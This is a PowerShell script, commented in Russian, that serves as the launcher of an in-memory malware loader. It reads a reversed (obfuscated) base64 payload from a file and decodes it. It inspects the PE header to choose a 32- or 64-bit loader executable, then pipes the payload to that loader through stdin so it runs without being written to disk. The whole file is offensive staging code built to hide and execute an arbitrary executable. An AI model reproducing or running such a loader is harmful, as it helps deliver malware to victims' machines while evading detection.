﻿# 1.ps1 — запуск base64 payload через внешний loader.exe в памяти
$ErrorActionPreference = 'Stop'

function Get-PayloadBytes {
    param([string]$Base64Path)

    if (-not (Test-Path $Base64Path -PathType Leaf)) {
        throw "Base64 file not found: $Base64Path"
    }

    $rev = Get-Content -Raw -Path $Base64Path
    if ([string]::IsNullOrWhiteSpace($rev)) {
        throw "Base64 file is empty."
    }

    $chars = $rev.ToCharArray()
    [Array]::Reverse($chars)
    $fixed = -join $chars

    [PSCustomObject]@{
        Bytes  = [Convert]::FromBase64String($fixed)
        Base64 = $fixed
    }
}

function Get-PEArchitecture {
    param([byte[]]$Bytes)
    if ($Bytes.Length -lt 0x100) { return "unknown" }
    if ($Bytes[0] -ne 0x4D -or $Bytes[1] -ne 0x5A) { return "unknown" }

    $e_lfanew = [BitConverter]::ToInt32($Bytes, 0x3C)
    if ($e_lfanew -lt 0 -or ($e_lfanew + 0x18) -ge $Bytes.Length) { return "unknown" }
    if ($Bytes[$e_lfanew] -ne 0x50 -or $Bytes[$e_lfanew+1] -ne 0x45) { return "unknown" }

    $optMagicOffset = $e_lfanew + 0x18
    if (($optMagicOffset + 1) -ge $Bytes.Length) { return "unknown" }
    $magic = [BitConverter]::ToUInt16($Bytes, $optMagicOffset)

    switch ($magic) { 0x10B { "x86" } 0x20B { "x64" } default { "unknown" } }
}

# === MAIN ===
$scriptDir  = Split-Path -Parent $PSCommandPath
Set-Location $scriptDir

$base64Path = (Resolve-Path ".\base64.txt").Path
$payload    = Get-PayloadBytes -Base64Path $base64Path
$arch       = Get-PEArchitecture -Bytes $payload.Bytes
$fixedBase64= $payload.Base64

$loaderPath = if ($arch -eq "x64") {
    Join-Path $scriptDir "loader64.exe"
} else {
    Join-Path $scriptDir "loader.exe"
}

if (-not (Test-Path $loaderPath)) {
    throw "Loader not found: $loaderPath"
}

Write-Host "Using loader: $loaderPath (arch=$arch)"

# Запуск loader с передачей base64 через stdin
$proc = Start-Process -FilePath $loaderPath -NoNewWindow -PassThru -RedirectStandardInput "STDIN" -RedirectStandardOutput "STDOUT" -RedirectStandardError "STDERR"
$writer = [System.IO.StreamWriter]::new($proc.StandardInput.BaseStream, [Text.Encoding]::UTF8)
$writer.Write($fixedBase64)
$writer.Close()

$proc.WaitForExit()

if ($proc.ExitCode -ne 0) {
    $err = Get-Content "STDERR"
    Write-Error "Loader failed (exit $($proc.ExitCode)): $err"
    exit $proc.ExitCode
}

Write-Host "Payload executed successfully."
